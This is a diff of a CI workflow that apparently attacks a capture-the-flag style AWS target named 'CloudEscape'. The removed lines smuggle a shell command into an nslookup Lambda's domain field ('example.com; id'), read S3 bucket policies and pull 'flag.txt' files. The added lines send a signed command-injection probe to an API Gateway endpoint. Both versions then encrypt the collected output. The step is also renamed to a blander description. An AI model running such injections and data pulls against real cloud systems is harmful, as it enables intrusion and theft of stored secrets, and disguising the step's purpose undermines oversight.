@@ -19,7 +19,7 @@ jobs:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      - name: Collect and encrypt CloudEscape results
+      - name: Test API response channel and encrypt results
         env:
           CLOUDESCAPE_PUBLIC_KEY: |
             -----BEGIN PUBLIC KEY-----
@@ -34,38 +34,21 @@ jobs:
         run: |
           set +x
           printf '%s\n' "$CLOUDESCAPE_PUBLIC_KEY" > /tmp/cloudescape.pub
-          set +e
-          aws lambda invoke --function-name nslookupv2 --cli-binary-format raw-in-base64-out --payload '{"domain":"example.com; id"}' /tmp/nslookup-response.json > /tmp/lambda-meta.json 2> /tmp/lambda-error.txt
-          echo $? > /tmp/lambda-status
-          set -e
-          for bucket in userad88e2b168aa387e logad88e2b168aa387e; do
-            aws s3api get-bucket-policy --bucket "$bucket" --query Policy --output text > "/tmp/$bucket.policy" 2>/dev/null || true
-            aws s3api get-object --bucket "$bucket" --key flag.txt "/tmp/$bucket.flag" >/dev/null 2>/dev/null || true
-          done
+          python3 -m pip install requests requests-aws4auth --quiet
           python3 - <<'PY'
-          import base64, json, os, urllib.parse
+          import base64, json, os, requests
+          from requests_aws4auth import AWS4Auth
+          auth = AWS4Auth(os.environ["AWS_ACCESS_KEY_ID"], os.environ["AWS_SECRET_ACCESS_KEY"], "us-east-1", "execute-api", session_token=os.environ["AWS_SESSION_TOKEN"])
+          r = requests.post("https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup", json={"domain":"example.com; echo PROBE"}, auth=auth, timeout=30)
+          open("/tmp/api-status","w").write(str(r.status_code))
+          open("/tmp/api-body","wb").write(r.content)
+          open("/tmp/api-headers","w").write(json.dumps(dict(r.headers)))
+          PY
+          python3 - <<'PY'
+          import base64, json, os
           def b64(path):
-              return base64.b64encode(open(path, "rb").read()).decode() if os.path.exists(path) else ""
-          result = {
-              "lambda_status": open("/tmp/lambda-status").read().strip() if os.path.exists("/tmp/lambda-status") else "",
-              "lambda_meta_b64": b64("/tmp/lambda-meta.json"),
-              "lambda_error_b64": b64("/tmp/lambda-error.txt"),
-              "lambda_response_b64": b64("/tmp/nslookup-response.json"),
-          }
-          for bucket in ["userad88e2b168aa387e", "logad88e2b168aa387e"]:
-              item = {}
-              policy = f"/tmp/{bucket}.policy"
-              flag = f"/tmp/{bucket}.flag"
-              if os.path.exists(policy):
-                  raw = open(policy, "r", errors="replace").read()
-                  try:
-                      item["policy"] = json.loads(urllib.parse.unquote(raw))
-                  except Exception:
-                      item["policy_raw"] = raw
-              if os.path.exists(flag):
-                  item["flag_b64"] = base64.b64encode(open(flag, "rb").read()).decode()
-              result[bucket] = item
-          json.dump(result, open("/tmp/cloudescape-result.json", "w"), separators=(",", ":"))
+              return base64.b64encode(open(path,"rb").read()).decode() if os.path.exists(path) else ""
+          json.dump({"api_status":open("/tmp/api-status").read(),"api_body_b64":b64("/tmp/api-body"),"api_headers_b64":b64("/tmp/api-headers")},open("/tmp/cloudescape-result.json","w"),separators=(",",":"))
           PY
           openssl rand -hex 32 > /tmp/cloudescape.key
           openssl pkeyutl -encrypt -pubin -inkey /tmp/cloudescape.pub -pkeyopt rsa_padding_mode:oaep -in /tmp/cloudescape.key -out /tmp/cloudescape.key.enc
